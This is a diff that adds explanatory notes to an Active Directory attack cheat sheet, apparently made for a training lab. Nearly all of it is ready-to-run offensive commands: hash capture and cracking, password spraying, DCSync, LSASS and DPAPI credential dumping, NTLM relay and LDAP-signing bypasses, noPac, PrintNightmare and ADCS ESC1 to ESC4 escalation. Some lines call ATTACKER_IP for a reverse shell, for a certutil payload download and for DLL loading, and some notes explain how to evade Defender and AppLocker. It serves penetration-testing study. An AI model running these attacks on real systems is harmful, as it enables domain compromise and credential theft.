@@ -14,6 +14,7 @@ ssh htb-student@ATTACK_HOST_IP          # Parrot Linux attack host
 xfreerdp /v:MS01_IP /u:htb-student /p:'Academy_student_AD!' /cert:ignore /dynamic-resolution
 # Windows attack host (MS01) — use when you need Windows tools
 ```
+> Replace `ATTACK_HOST_IP` and `MS01_IP` with the spawned lab IPs. SSH gives a terminal on the Linux host. xfreerdp opens a graphical RDP session to the Windows attack host. Use MS01 when you need Windows-only tools like Rubeus or PowerView.
 
 ---
 
@@ -50,6 +51,7 @@ cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt | head -5
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O
 # -m 5600 = NTLMv2 mode
 ```
+> Run Responder in a tmux pane and leave it running. It answers LLMNR/NBT-NS broadcasts and captures NTLMv2 hashes automatically. Hashes are saved to `/usr/share/responder/logs/` named by protocol, hash type, and source IP. Mode `5600` cracks NTLMv2. `-O` enables optimizer mode for faster cracking.
 
 ### Inveigh — When Responder Misses Users
 **When:** A user is on the internal Windows network but authenticates via Kerberos (not NTLM), so Responder doesn't catch them. Run Inveigh on a Windows machine INSIDE the network instead.
@@ -73,6 +75,7 @@ GET NTLMV2USERNAMES # see who has authenticated
 # Crack the hash on Kali (same as Responder):
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O
 ```
+> Use the PowerShell version when you need a quick run with a timer. Use `Inveigh.exe` (C# binary) for longer captures — it is harder to detect. Press ESC to enter the interactive console. `GET NTLMV2UNIQUE` gives one clean hash per user — use this for cracking.
 
 ### Kerbrute — Username Enumeration Without Creds
 **When:** You have no credentials at all but want a valid user list to spray against.
@@ -86,6 +89,7 @@ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt -o vali
 # -o = save valid users to file for spraying
 # Bonus: automatically dumps AS-REP hashes for accounts with no pre-auth required
 ```
+> Tests every username in the wordlist against Kerberos. Valid usernames get a different error code than invalid ones. No lockouts triggered. Automatically flags and dumps hashes for AS-REP roastable accounts.
 
 ### AS-REP Roasting — No Creds Needed
 **When:** You have valid usernames but no password. Some accounts have pre-auth disabled — you can get their hash without knowing their password.
@@ -103,6 +107,7 @@ hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt -O
 # From Windows (check everyone at once):
 .\Rubeus.exe asreproast /format:hashcat /nowrap
 ```
+> `-no-pass` means you do not need to know any password — the DC sends the encrypted blob to anyone who asks for accounts with pre-auth disabled. `-format hashcat` outputs the hash in the format Hashcat expects. Mode `18200` is Kerberos AS-REP. On Windows, Rubeus does the same thing in one command.
 
 ---
 
@@ -123,6 +128,7 @@ rpcclient -U "" -N DC_IP   # then type: getdompwinfo
 
 # Rule: if threshold=5, try MAX 3 passwords, then wait for lockout duration
 ```
+> `--pass-pol` returns the full password policy. The NULL session (`-U "" -N`) connects without credentials — only works on DCs that allow anonymous access. Always run this before spraying. The safe formula is: attempts per round = threshold minus 2.
 
 ### Build a User List
 **When:** Before spraying — you need valid usernames to spray against.
@@ -138,6 +144,7 @@ crackmapexec smb DC_IP -u USER -p PASS --users
 # Via kerbrute (no creds):
 kerbrute userenum -d DOMAIN --dc DC_IP /opt/jsmith.txt
 ```
+> Three ways to build a user list. LDAP anonymous bind works on many older DCs. `--users` with credentials is best because it also returns the bad password count so you can skip accounts near the lockout threshold. Kerbrute is the stealthy no-credentials option.
 
 ### Password Spraying — Linux
 **When:** You have a user list and want to test one password against many accounts.
@@ -158,6 +165,7 @@ for u in $(cat users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" D
 crackmapexec smb DC_IP -u FOUND_USER -p FOUND_PASS
 # Pwn3d! = local admin on that host
 ```
+> Kerbrute generates Event 4771 (Kerberos) instead of the noisier 4625 (SMB). `--continue-on-success` keeps going after the first hit so you find all valid accounts. The rpcclient one-liner shows only successful logins via `grep Authority`. Always validate hits with CrackMapExec — `Pwn3d!` means local admin access.
 
 ### Password Spraying — Windows
 **When:** You're on MS01 and need to spray from inside the domain.
@@ -168,6 +176,7 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 # Auto-builds user list from AD, auto-checks lockout policy, sprays safely
 # -OutFile = save successful credential pairs
 ```
+> The safest Windows spray tool. It queries AD for the user list and the lockout policy automatically, then excludes accounts near the threshold. `-OutFile` saves hits to a file so you do not miss them in console output.
 
 ---
 
@@ -198,6 +207,7 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp
 # "Computers with Unsupported Operating Systems"
 # "Map Domain Trusts"
 ```
+> `-ns DC_IP` is critical — it forces hostname resolution through the DC so BloodHound can build relationships correctly. `-c All` collects every data type. Zip the JSON files and upload through the BloodHound GUI. The listed queries are the most valuable — run them all as soon as data is loaded.
 
 ### CrackMapExec — Swiss Army Knife
 **When:** Quick credential validation, session hunting, share enumeration, remote command execution.
@@ -213,6 +223,7 @@ crackmapexec smb SUBNET/23 -u USER -H NTLM_HASH         # pass-the-hash sweep
 crackmapexec winrm HOST -u USER -p PASS                 # test WinRM access
 crackmapexec mssql HOST -u USER -p PASS                 # test MSSQL access
 ```
+> All CrackMapExec module variations. `-x` runs a shell command and requires admin access. Subnet sweeps identify which hosts your credentials work on. `-H` accepts an NTLM hash instead of a plaintext password. `Pwn3d!` in output = local admin confirmed on that host.
 
 ### PowerView — Deep AD Enumeration (Windows)
 **When:** When you need detailed AD object information, ACL enumeration, or want to test specific attack paths from the Windows side.
@@ -240,6 +251,7 @@ Get-DomainForeignGroupMember -Domain FOREIGN.LOCAL          # cross-domain group
 Get-DomainTrust                    # direct trusts
 Get-DomainTrustMapping             # all trusts (recursive)
 ```
+> `Find-InterestingDomainAcl` scans the whole domain for non-default ACEs. `-ResolveGUIDs` converts raw GUID values to readable right names. `-Recurse` on group membership catches DAs who are members through nested groups. `Get-DomainTrustMapping` walks all trusts recursively — use this to find cross-forest attack paths.
 
 ### Credentialed Enumeration — Linux Tools
 
@@ -264,6 +276,7 @@ adidnsdump -u DOMAIN\\USER -p PASS DC_IP
 .\Snaffler.exe -s -d DOMAIN -o snaffler.log -v data
 # Finds: web.config files, .bat scripts, unattend.xml, password files, etc.
 ```
+> `spider_plus` crawls a share recursively and saves a JSON file listing. `smbmap -R` does a recursive directory listing without reading file contents. `adidnsdump` extracts all DNS records stored in AD — these reveal internal hostnames you can target. Snaffler hunts for credential files across all accessible shares.
 
 ### Security Controls Recon — Check BEFORE Dropping Tools
 **When:** Immediately after getting code execution on any Windows host. Tells you what payloads will/won't run and what evasion you need.
@@ -295,6 +308,7 @@ Get-DomainComputer -Properties 'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' | W
 # Property visible → you have LAPS read rights → free local admin passwords
 # Use: crackmapexec ldap DC_IP -u USER -p PASS -M laps
 ```
+> Run this block right after getting a foothold — it tells you what tools will work. `Set-MpPreference -DisableRealtimeMonitoring $true` requires admin rights. The AppLocker XML shows allowed execution paths — drop payloads in those paths to bypass it. `LanguageMode` check takes one second and can save you from broken tool attempts. The LAPS (Local Administrator Password Solution) PowerView query — if `ms-Mcs-AdmPwd` is visible, you can read local admin passwords for those computers.
 
 ---
 
@@ -324,11 +338,13 @@ hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -O
 .\Rubeus.exe kerberoast /user:TARGET /nowrap             # single account
 # /nowrap = don't break the hash across lines (critical — broken hash = won't crack)
 ```
+> Always check `MemberOf` in step 1 before requesting tickets — targeting a DA member means instant DA if cracked. Always use `-outputfile` — never copy TGS hashes from the terminal because they are too long and often get mangled. Check the hash prefix to pick the right Hashcat mode. `/nowrap` in Rubeus is mandatory — a broken hash will never crack.
 
 **Hash length check before cracking:** odd number of hex chars = truncated = won't crack.
 ```bash
 python3 -c "blob='PASTE_HEX_BLOB'; print('OK' if len(blob)%2==0 else 'TRUNCATED')"
 ```
+> Paste the hex portion of your hash in place of `PASTE_HEX_BLOB`. If the length is odd, the hash was truncated when you copied it and Hashcat will reject it. Go back and get the hash from the output file instead.
 
 ### Targeted Kerberoasting — Force a Hash from Any User
 **When:** A user has no SPN, but you have GenericWrite/GenericAll over their account. Set a fake SPN, Kerberoast them, then clean up.
@@ -346,6 +362,7 @@ GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASS -request-user TARGET_USER
 # Step 3: CLEAN UP the SPN after (important for real engagements):
 Set-DomainObject -Credential $Cred -Identity TARGET_USER -Clear serviceprincipalname -Verbose
 ```
+> Step 1 writes a fake Service Principal Name (SPN) to the target account using your `GenericWrite` access. This makes the account Kerberoastable even though it wasn't before. Step 2 requests the ticket immediately. Step 3 removes the fake SPN — always clean up in real engagements to avoid leaving artifacts.
 
 ### RBCD — Resource-Based Constrained Delegation
 **When:** You have `GenericWrite`, `GenericAll`, or `WriteDACL` over a computer object (BloodHound: "Find Computers where the Current User has Write Privileges"). Lets you impersonate ANY user (including DA) to that computer.
@@ -373,6 +390,7 @@ secretsdump.py -k -no-pass TARGET_COMP.DOMAIN.LOCAL   # dump SAM/LSA
 # Cleanup (clear the RBCD attribute after):
 rbcd.py -delegate-to 'TARGET_COMP$' -action 'flush' 'DOMAIN/USER:PASS' -dc-ip DC_IP
 ```
+> Resource-Based Constrained Delegation (RBCD) lets a controlled machine account impersonate any user to any service on the target. Step 1 creates a fake computer account (any user can do this by default). Step 2 writes the fake computer's Security Identifier (SID) into the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. Step 3 uses the S4U protocol extensions to get a ticket as Administrator. `KRB5CCNAME` points tools to the saved ticket file. `-k -no-pass` tells the Impacket tools to use the Kerberos ticket instead of a password. Always clean up step 2 after the engagement.
 
 **From Windows (PowerView + Rubeus):**
 ```powershell
@@ -394,6 +412,7 @@ Get-DomainComputer TARGET_COMP | Set-DomainObject -Set @{'msds-allowedtoactonbeh
 .\Rubeus.exe s4u /user:EVILPC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET_COMP.DOMAIN.LOCAL /ptt
 ls \\TARGET_COMP\C$
 ```
+> Powermad's `New-MachineAccount` creates the fake computer account. The security descriptor in step 3 is built in binary form and written directly to the LDAP attribute. Rubeus `hash` converts the password to an RC4 hash. Rubeus `s4u` performs the S4U2Self and S4U2Proxy exchange and injects the resulting ticket with `/ptt` (pass-the-ticket). Test access immediately with `ls`.
 
 ### ACL Abuse — Take Over Other Accounts
 **When:** BloodHound shows you have GenericAll, ForceChangePassword, GenericWrite, WriteDACL, or WriteOwner on another account or group.
@@ -421,6 +440,7 @@ Add-DomainGroupMember -Identity "Domain Admins" -Members youruser -Credential $C
 # Verify:
 Get-DomainGroupMember -Identity "Domain Admins" | Select MemberName
 ```
+> Each line abuses a different Access Control Entry (ACE) type. The `$Cred` object lets you act as your compromised user for all operations. `ForceChangePassword` resets a target's password without needing their current one — always get client approval first. `WriteDACL` with `-Rights All` grants you `GenericAll` on the object, then you can do anything. Verify group membership changes immediately.
 
 **From Linux (using ldap3 directly):**
 ```python
@@ -433,6 +453,7 @@ conn.modify('CN=Domain Admins,CN=Users,DC=domain,DC=local',
     {'member': [(ldap3.MODIFY_ADD, ['CN=youruser,CN=Users,DC=domain,DC=local'])]})
 print(conn.result)
 ```
+> Use this when you want to abuse ACLs directly from Linux without a Windows host. `ldap3` is a Python LDAP library. `conn.bind()` authenticates. `conn.modify` with `MODIFY_ADD` adds a member to the group. Check `conn.result` to confirm success.
 
 ### DCSync — Dump All Domain Hashes
 **When:** You have Domain Admin rights, or an account with DS-Replication-Get-Changes-All right (check BloodHound → "Find Principals with DCSync Rights").
@@ -457,6 +478,7 @@ lsadump::dcsync /domain:DOMAIN.LOCAL /all    # dump everything
 # With explicit creds (useful when your session doesn't have DA but you know DA creds):
 lsadump::dcsync /user:Administrator /domain:DOMAIN.LOCAL /authuser:USER /authdomain:DOMAIN /authpassword:PASS
 ```
+> DCSync replicates the AD database as if you were a second Domain Controller. `-just-dc-ntlm` speeds it up by skipping Kerberos key extraction. The `:NTLM_HASH` format puts an empty LM hash before the colon. In Mimikatz, `privilege::debug` is required before any credential dumping. `/all` dumps every account in the domain.
 
 ### Pass-the-Hash — Use NTLM Without Cracking
 **When:** You have an NTLM hash from secretsdump, LSASS dump, or Mimikatz. Use it directly without cracking.
@@ -483,6 +505,7 @@ crackmapexec smb SUBNET/24 -u USER -H NTLM_HASH
 smbclient -U USER --pw-nt-hash //HOST/C$ NTLM_HASH
 # Then: get Users\Administrator\Desktop\flag.txt /tmp/flag.txt
 ```
+> Pass-the-Hash (PtH) works because Windows NTLM authentication only needs the hash — it never verifies the plaintext. `-H` in evil-winrm and `-hashes :HASH` in Impacket tools both accept NTLM hashes. Use wmiexec over psexec when you want less noise. The subnet sweep finds every host where the hash grants local admin access.
 
 ### LSASS Dump — Get Credentials from Memory
 **When:** You have local admin or SYSTEM on a machine. Dump LSASS to get credentials of any logged-in user.
@@ -506,6 +529,7 @@ sekurlsa::tickets           # list Kerberos tickets in memory
 # Method 3: Remote via secretsdump (if you have admin SMB access):
 secretsdump.py DOMAIN/USER:PASS@HOST   # dumps SAM + LSA Secrets
 ```
+> Method 1 uses a signed Windows DLL to create a memory dump — less likely to trigger AV than running Mimikatz directly. Replace `PID` with the actual LSASS process ID. Transfer the `.dmp` file to Kali and parse it with `pypykatz`. Method 2 is Mimikatz directly — `privilege::debug` elevates to `SeDebugPrivilege`. Method 3 is fully remote — no file upload needed if you have admin SMB.
 
 ### DPAPI — Decrypt Saved Credentials
 **When:** You have user-context code execution and want their stored passwords: browser saved logins, RDP/PuTTY cached creds, Wi-Fi passwords, Outlook profiles, mapped drive credentials.
@@ -531,6 +555,7 @@ dpapi.py masterkey -file MASTERKEY_FILE -password USER_PASSWORD
 dpapi.py credential -file CREDENTIAL_FILE -key 0xMASTERKEY_HEX
 # Reveals: TargetName, Username, Password
 ```
+> Pull the master key files from `%APPDATA%\Microsoft\Protect\<SID>\` and the credential blobs from `%APPDATA%\Microsoft\Credentials\`. Step 2 derives the master key from the user's password. Step 3 uses that key to decrypt a specific credential blob. The output shows the stored application name, username, and plaintext password.
 
 **With Mimikatz (Windows):**
 ```powershell
@@ -549,6 +574,7 @@ sekurlsa::dpapi                                # extracts master keys from LSASS
 dpapi::masterkey /in:MASTERKEY_FILE /password:USER_PASSWORD
 dpapi::masterkey /in:MASTERKEY_FILE /sid:USER_SID /password:USER_PASSWORD
 ```
+> `vault::list` lists all Credential Manager entries. `vault::cred /patch` attempts to decrypt them. `sekurlsa::dpapi` extracts cached master keys from LSASS memory — if successful, subsequent `dpapi::cred` calls auto-decrypt blobs. `/sid` is needed when decrypting another user's blobs (for example, from a service account).
 
 **Domain Backup Key — Decrypt ANY User's DPAPI Data (DA required to extract):**
 ```bash
@@ -561,6 +587,7 @@ dpapi.py masterkey -file VICTIM_MASTERKEY -pvk DOMAIN_BACKUP.pvk
 
 # This is gold for post-DA persistence — you can decrypt any user's saved creds without their password.
 ```
+> The domain DPAPI backup key is stored on the DC and can decrypt any user's master key in the entire domain. Export it once as DA and keep it. With it, you can decrypt any user's saved browser passwords, Credential Manager entries, or WiFi keys at any time without knowing their password.
 
 **Chrome / Edge browser passwords:**
 ```powershell
@@ -571,6 +598,7 @@ dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /u
 .\SharpChrome.exe logins
 .\SharpChrome.exe cookies
 ```
+> Chrome stores saved passwords in an SQLite database encrypted with DPAPI. Mimikatz `dpapi::chrome` decrypts that database in place. SharpChrome gives a cleaner table output and can also dump cookies. Run as the user who owns the Chrome profile, or with their master key available.
 
 ### SAM / Registry Hives — Local Account Hashes
 **When:** You have admin on a non-DC machine and want local hashes + LSA Secrets.
@@ -592,6 +620,7 @@ secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
 # Crack cached DCC2 hashes:
 hashcat -m 2100 dcc2_hash.txt /usr/share/wordlists/rockyou.txt
 ```
+> `reg save` exports registry hives to files — requires admin. Transfer all three files to Kali. `secretsdump.py LOCAL` parses them offline without touching the network. `DefaultPassword` under LSA Secrets is the AutoLogon plaintext password — it appears when an admin sets up automatic login. Mode `2100` is Domain Cached Credentials 2 (DCC2) — difficult to crack but useful for confirming which domain users logged in recently.
 
 ### SeImpersonatePrivilege — SQL/IIS Service to SYSTEM
 **When:** You have command execution as a service account (SQL Server, IIS AppPool) with SeImpersonatePrivilege. This is nearly universal on Windows services.
@@ -609,6 +638,7 @@ whoami /priv   # look for SeImpersonatePrivilege = Enabled
 # JuicyPotato (works on older Server versions, needs specific CLSID):
 .\JuicyPotato.exe -l 1337 -p C:\nc.exe -a "ATTACKER_IP PORT -e cmd.exe" -t *
 ```
+> `SeImpersonatePrivilege` is enabled on almost all Windows service accounts (IIS, SQL Server, etc.). It allows the process to impersonate a client token. PrintSpoofer abuses the Print Spooler service to get a SYSTEM token. `-i` makes it interactive. Use JuicyPotato on older systems (Server 2016 and earlier) — you need to find the right Component Object Model (COM) Class ID (CLSID) for that system version.
 
 ### MSSQL Abuse
 **When:** You have MSSQL credentials (from web.config, password spray, etc.) and want OS command execution.
@@ -633,6 +663,7 @@ xp_cmdshell "certutil -urlcache -split -f http://ATTACKER_IP/tool.exe C:\Windows
 # NTLM coercion (force target to auth to us → Responder capture):
 xp_dirtree \\ATTACKER_IP\share   # forces MSSQL service to auth to us
 ```
+> `Get-SQLInstanceDomain` finds SQL Server instances registered in AD. `-windows-auth` uses the domain account instead of SQL auth. `enable_xp_cmdshell` is an mssqlclient.py built-in shortcut. `xp_dirtree` with a UNC path to your Responder listener forces the SQL service account to authenticate to you — capturing its NTLMv2 hash.
 
 ### MSSQL Linked Servers — Pivot Between SQL Instances
 **When:** Compromised SQL server has linked server connections to other SQL hosts (often configured for cross-database queries with elevated rights).
@@ -653,6 +684,7 @@ EXECUTE('xp_cmdshell ''whoami''') AT [LINKED_SERVER]
 -- Chain multiple hops:
 EXECUTE('EXECUTE(''xp_cmdshell ''''whoami'''''')  AT [HOP2]') AT [HOP1]
 ```
+> `AT [LINKED_SERVER]` runs a query on the remote SQL instance. Check `system_user` to see which account you are running as on the remote server — it is often `sa` or a privileged service account. The double-quoted `sp_configure` enables `xp_cmdshell` on the remote server. Chaining hops requires nested EXECUTE with increasing single-quote escaping.
 
 ### Kerberos Double Hop Problem
 **When:** You SSH/WinRM into Host A as a domain user, then try to access Host B from Host A using the same user → access denied even though your creds are valid.
@@ -685,6 +717,7 @@ Enter-PSSession -ComputerName HOST_A -ConfigurationName MyShell
 # RDP creates an interactive logon (Type 2). Credentials stay in LSASS on the target,
 # so subsequent network access works. WinRM is network logon (Type 3) — no creds cached.
 ```
+> The Kerberos Double Hop problem occurs because WinRM uses a network logon (Type 3) — credentials are not cached on the intermediate host, so it cannot forward them. Workaround 1 is simplest — pass credentials explicitly to each remote call. Workaround 3 (pass-the-ticket) is cleanest for long sessions — inject the TGT once and Kerberos handles forwarding automatically.
 
 ### NTLM Relay — No Cracking Needed
 **When:** SMB signing is disabled on the target (check: `crackmapexec smb TARGET` → signing:False). Relay instead of crack.
@@ -704,12 +737,14 @@ sudo responder -I ens224 -wf
 
 # Targets.txt = list of IPs with SMB signing disabled
 ```
+> You must disable Responder's SMB server first — both cannot listen on port 445 at the same time. ntlmrelayx intercepts hashes from Responder and immediately forwards them to targets in the list. `-smb2support` handles modern SMB2. `-i` opens an interactive SMB shell on a local port. `-c` executes a command on the relay target.
 
 **Find relay-able SMB targets:**
 ```bash
 crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
 # Produces a file of hosts with signing:False — feed straight to ntlmrelayx -tf
 ```
+> Sweeps the subnet and generates a ready-to-use target file of hosts that do not require SMB signing. Pass this file directly to ntlmrelayx with `-tf relay_targets.txt`.
 
 ### LDAP Relay — When SMB Signing Is On But LDAP Isn't
 **When:** SMB signing is enforced (you can't SMB-relay) but LDAP signing/channel binding is NOT enforced on the DC. Default until 2023 patches — still common in unpatched environments.
@@ -736,6 +771,7 @@ ntlmrelayx.py -t ldap://DC_IP --delegate-access -tn TARGET_COMP$   # set up RBCD
 # Trigger with PetitPotam → coerce DC$ → relay to LDAPS → set RBCD on DC → S4U → DA
 python3 PetitPotam.py ATTACKER_IP DC_IP
 ```
+> When you relay NTLM to LDAP instead of SMB, you get AD write access — not just a file share. `--escalate-user` grants the specified user DCSync rights by writing a new Access Control Entry (ACE) on the domain object. `--add-computer` creates a machine account you control, useful for RBCD. `PetitPotam` coerces the DC to authenticate to you via the MS-EFSRPC interface, giving you the DC's machine account hash to relay.
 
 **Signing / Channel Binding status — Quick Recon:**
 ```bash
@@ -743,6 +779,7 @@ python3 PetitPotam.py ATTACKER_IP DC_IP
 crackmapexec ldap DC_IP -u USER -p PASS -M ldap-checker
 # Outputs: LDAP signing required? LDAPS channel binding required?
 ```
+> The `ldap-checker` module reports exactly which protections are enabled. Run this before attempting any LDAP relay so you know which bypass technique to use.
 
 ### LDAP Signing / Channel Binding Bypass Techniques
 **When:** LDAP signing OR LDAPS channel binding (EPA) is enforced and a direct relay fails. There are several bypasses depending on the exact policy state.
@@ -763,6 +800,7 @@ python3 LdapRelayScan.py -method BOTH -dc-ip DC_IP -u USER -p PASS
 # Outputs: LDAPS Channel Binding: Required / NOT_REQUIRED / Not Defined
 #          LDAP Signing: Required / NOT_REQUIRED
 ```
+> Run either tool to determine which protections are active before choosing a bypass technique. The output maps directly to the table above. `LdapRelayScan.py` is more precise — use it when nxc gives unclear results.
 
 #### Bypass 1 — CVE-2019-1040 "Drop the MIC"
 **When:** Target DC isn't patched against CVE-2019-1040 (pre-June 2019). Strips the Message Integrity Code from the NTLM authenticate message so signing tokens become invalid → relay survives.
@@ -777,6 +815,7 @@ python3 PetitPotam.py ATTACKER_IP DC_IP
 nxc smb DC_IP -u USER -p PASS -M zerologon         # different bug but same patch level signal
 nxc smb DC_IP -u USER -p PASS -M ms17-010          # quick patch-level sanity check
 ```
+> `--remove-mic` strips the Message Integrity Code (MIC) from the NTLM Authenticate message before relaying. This causes the signing requirement to fail validation. Check the DC's patch level first — this is patched in June 2019 updates.
 
 #### Bypass 2 — NTLMv1 Downgrade
 **When:** `LmCompatibilityLevel` on the DC is ≤ 2 (allows NTLMv1). NTLMv1 doesn't carry a MIC, so signing requirements don't apply meaningfully.
@@ -796,6 +835,7 @@ sudo responder -I ens224 --lm    # request LM/NTLMv1
 # Or:
 hashcat -m 5500 ntlmv1.txt /usr/share/wordlists/rockyou.txt
 ```
+> NTLMv1 has no Message Integrity Code, so signing requirements do not block the relay. `lmcompatibilitylevel` values 0–2 mean the server accepts NTLMv1. `--lm` in Responder forces clients to downgrade. crack.sh can crack NTLMv1 free using rainbow tables in seconds. Mode `5500` is NTLMv1 in Hashcat.
 
 #### Bypass 3 — Cross-Protocol Relay (HTTP/RPC → LDAP)
 **When:** EPA is enforced on LDAPS but the source protocol of the relay doesn't include channel binding tokens. HTTP/WebDAV auth from a coerced victim doesn't include CBT — when relayed, LDAPS can't compare and falls back.
@@ -813,6 +853,7 @@ python3 printerbug.py DOMAIN/USER:PASS@VICTIM 'ATTACKER_IP@80/anything'
 .\WebDAVTrickExe.exe              # forces WebClient to start
 # or check: sc query webclient
 ```
+> HTTP authentication does not include Channel Binding Tokens (CBT), so relaying HTTP to LDAPS bypasses Extended Protection for Authentication (EPA). `-wh` makes ntlmrelayx serve a Web Proxy Auto-Discovery (WPAD) file that redirects browser authentication to your HTTP listener. The `@80` in the UNC path tricks PrinterBug into using HTTP rather than SMB. WebClient must be running on the victim for this to work.
 
 #### Bypass 4 — Shadow Credentials Instead of Relay
 **When:** All relay bypasses fail. If you have GenericWrite on any user/computer, skip the LDAP relay problem entirely — use Certipy Shadow Credentials.
@@ -821,6 +862,7 @@ python3 printerbug.py DOMAIN/USER:PASS@VICTIM 'ATTACKER_IP@80/anything'
 certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET_USER
 # Adds a key cred → requests TGT via PKINIT → returns NT hash → removes the cred
 ```
+> Shadow Credentials bypasses the LDAP relay problem entirely. You need `GenericWrite` on the target account. `certipy shadow auto` adds a key credential, requests a Ticket Granting Ticket (TGT) via PKINIT, dumps the NT hash, then removes the credential — all in one command. No relay infrastructure needed.
 
 #### Recon checklist before attempting any bypass
 ```bash
@@ -837,6 +879,7 @@ nxc smb TARGETS_CIDR -u USER -p PASS -M lmcompatibilitylevel
 # 4. Check WebClient service on workstation targets (for HTTP→LDAPS relay):
 nxc smb TARGETS_CIDR -u USER -p PASS -M webdav   # finds hosts with WebDAV running
 ```
+> Run all four checks in order before choosing a bypass technique. Step 1 tells you which bypasses apply. Step 2 tells you if Drop-the-MIC is available. Step 3 tells you if NTLMv1 downgrade is possible. Step 4 finds workstations suitable for the HTTP→LDAPS relay path.
 
 ### Privileged Access — Getting Shells
 
@@ -859,6 +902,7 @@ smbexec.py DOMAIN/USER:PASS@HOST
 # Read a file remotely (no shell needed):
 smbclient -U USER --pw-nt-hash //HOST/C$ NTLM_HASH -c "get Users\\Administrator\\Desktop\\flag.txt /tmp/flag.txt"
 ```
+> Choose the right shell method for the situation. evil-winrm needs the user to be in the Remote Management Users group. psexec.py runs as SYSTEM but creates a service and writes a binary to disk — detectable. wmiexec.py runs as the authenticated user with no disk writes — prefer this when stealth matters. `--pw-nt-hash` tells smbclient the password argument is an NTLM hash.
 
 ---
 
@@ -879,6 +923,7 @@ python3 noPac.py DOMAIN/USER:PASS -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonat
 # Or get a shell:
 python3 noPac.py DOMAIN/USER:PASS -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate administrator -shell
 ```
+> The `nopac` module checks if the DC is vulnerable before you run the exploit. `--impersonate administrator` requests a service ticket as the domain administrator. `-dump` runs DCSync immediately after. `-dc-host` needs the hostname (not just the IP) for Kerberos to work correctly.
 
 ### PrintNightmare — Remote SYSTEM via Print Spooler
 **When:** Print Spooler service is running on the target (check: `Get-Service Spooler`). Unpatched Server 2016/2019.
@@ -891,6 +936,7 @@ python3 CVE-2021-1675.py DOMAIN/USER:PASS@HOST '\\ATTACKER_IP\share\malicious.dl
 # Check if spooler is running:
 crackmapexec smb HOST -u USER -p PASS -M spooler
 ```
+> Always check if the Print Spooler service is running before attempting this. The exploit loads a malicious DLL via the RPC print driver installation path. Host the DLL on an SMB share (use `smbserver.py`). Generate the DLL with msfvenom — a reverse shell or user-add payload both work.
 
 ### ADCS Attacks — Certificate Services Abuse (ESC1–ESC11)
 **When:** AD Certificate Services is deployed. Certipy is THE tool — enumerate templates first, then pick the ESC that matches.
@@ -908,6 +954,7 @@ certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable -stdout
 .\Certify.exe find /enrolleeSuppliesSubject     # ESC1 specifically
 .\Certify.exe cas                                # list Certificate Authorities
 ```
+> Always enumerate before exploiting. `-vulnerable` filters results to only show templates with known misconfigurations — much cleaner than reading everything. Certipy also saves `.json`, `.txt`, and `.zip` files automatically. Certify's `/enrolleeSuppliesSubject` flag finds ESC1 templates specifically.
 
 #### ESC1 — Template Allows SAN + Client Auth
 **Indicators:** `mspki-certificate-name-flag = 1` (ENROLLEE_SUPPLIES_SUBJECT) + Client Auth EKU + Domain Users enrollment rights.
@@ -922,6 +969,7 @@ certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST \
 certipy auth -pfx administrator.pfx -domain DOMAIN.LOCAL
 # Returns: administrator's NTLM hash → PtH to DA
 ```
+> ESC1 works because the template has `ENROLLEE_SUPPLIES_SUBJECT` set, which lets you specify any User Principal Name (UPN) in the Subject Alternative Name (SAN). You supply `administrator@domain.local` and the DC issues a cert proving you are that user. `certipy auth` uses PKINIT to trade the cert for an NT hash.
 
 #### ESC2 — Template Allows Any Purpose / SubCA EKU
 **Indicators:** Template has `Any Purpose` EKU or no EKU restriction + Domain Users can enroll. Cert can be used for client auth despite the template not naming it.
@@ -937,6 +985,7 @@ certipy auth -pfx administrator.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
 # Step 3: PtH to DA:
 psexec.py -hashes :ADMIN_HASH 'DOMAIN/administrator@DC_IP'
 ```
+> ESC2 templates have an `Any Purpose` Extended Key Usage (EKU) or no EKU restriction at all. Even though the template does not name Client Authentication, the cert can still be used for it. Exploitation is identical to ESC1.
 
 #### ESC3 — Enrollment Agent Template
 **Indicators:** Template has `Certificate Request Agent` EKU + low-priv users can enroll.
@@ -957,6 +1006,7 @@ certipy auth -pfx administrator.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
 # Step 4: PtH:
 psexec.py -hashes :ADMIN_HASH 'DOMAIN/administrator@DC_IP'
 ```
+> ESC3 abuses the `Certificate Request Agent` EKU. Step 1 gets you an enrollment agent certificate. In step 2 you use that agent cert to request a certificate on behalf of any user, including the domain administrator. The `-on-behalf-of` flag specifies the impersonation target. The resulting cert authenticates as that user.
 
 #### ESC4 — Vulnerable Template ACL (you can modify template)
 **Indicators:** BloodHound shows `GenericAll`/`WriteDacl`/`WriteOwner` on a template object.
@@ -980,6 +1030,7 @@ psexec.py -hashes :ADMIN_HASH 'DOMAIN/administrator@DC_IP'
 # Step 5: CLEAN UP — restore original template config:
 certipy template -u USER@DOMAIN -p PASS -template VulnTemplate -configuration VulnTemplate.json
 ```
+> ESC4 requires write rights on the template object itself (not just enrollment rights). Save the original configuration in step 1 — this is critical for cleanup. Certipy's default modification converts the template to ESC1-style. Always restore the template in step 5 before ending the engagement.
 
 #### ESC6 — CA Has EDITF_ATTRIBUTESUBJECTALTNAME2 Set
